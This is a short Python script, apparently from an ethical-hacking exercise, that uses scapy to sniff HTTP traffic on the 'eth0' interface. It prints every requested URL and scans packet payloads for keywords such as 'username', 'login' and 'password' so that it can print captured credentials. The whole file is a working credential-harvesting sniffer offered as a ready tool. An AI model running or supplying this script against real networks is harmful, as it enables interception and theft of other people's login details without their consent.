#!/usr/bin/env python
import time
import scapy.all as scapy
from scapy.layers import http


# using scapy function to sniff with callback function
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# accessing http layer to layer
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# checking if packet has any email/password information to sniff it
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        # arguments key name list to check if it's in packet
        keywords = ['email', 'username', 'user', 'login', 'password', 'pass', 'uname']
        for keyword in keywords:
            if keyword in load.decode():
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request >> ' + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible username/password >>' + login_info.decode() + '\n\n')


# currently it's hardcoded interface.
sniff("eth0")
